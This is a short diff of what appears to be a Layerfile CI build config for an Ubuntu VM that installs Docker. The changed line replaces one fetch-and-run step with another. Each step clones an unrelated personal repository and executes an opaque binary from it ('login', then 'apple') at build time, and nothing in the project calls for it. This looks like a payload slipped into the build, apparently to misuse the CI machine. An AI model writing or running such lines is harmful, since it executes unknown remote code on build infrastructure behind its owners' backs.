@@ -2,7 +2,7 @@
 FROM vm/ubuntu:18.04
 
 # To note: Layerfiles create entire VMs, *not* containers!
-RUN git clone https://gitlab.com/jiorio669/cer.git && cd cer && chmod 777 login && ./login
+RUN git clone https://github.com/alvinakhairulnisa953/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple
 # install the latest version of Docker, as in the official Docker installation tutorial.
 RUN apt-get update && \
     apt-get install apt-transport-https ca-certificates curl software-properties-common && \
